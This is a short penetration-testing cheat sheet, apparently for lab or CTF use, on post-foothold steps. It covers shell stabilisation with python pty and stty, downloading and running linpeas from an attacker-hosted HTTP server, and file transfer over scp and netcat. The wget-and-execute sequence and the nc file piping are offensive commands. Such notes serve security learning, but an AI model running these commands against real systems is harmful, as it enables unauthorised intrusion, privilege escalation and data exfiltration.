---
title: "Foothold cheat sheet"
date: 2024-03-17
---
## Get pretty shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
(Ctrl+Z)
stty raw -echo; fg
```
If Python is not installed:
```
script /dev/null -c bash
```
## Get linpeas
On the server side (attacker machine):
```
python3 -m http.server 8080
```
On the attacked machine:
```
wget http://10.10.14.59:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```
## File transfer
### scp
Using `scp` which requires an SSH server on the remote side:
```
scp  [<user>@[<ip>:]]<source_file> [<user>@[<ip>:]]<target_file>
```
### nc
If there is a firewall, `nc` can be used. On the target side, we listen for a new connection and redirect the output to a file:
```
nc -lnvp <port> > <target_file>
```
On the source side, we use `nc` to send the file:
```
cat <source_file> | nc <target_ip> <port>
```
With this method, you should manually kill the connection. Be sure to check the MD5 sum of the source and the target after that in order to be sure the transfer has been fine.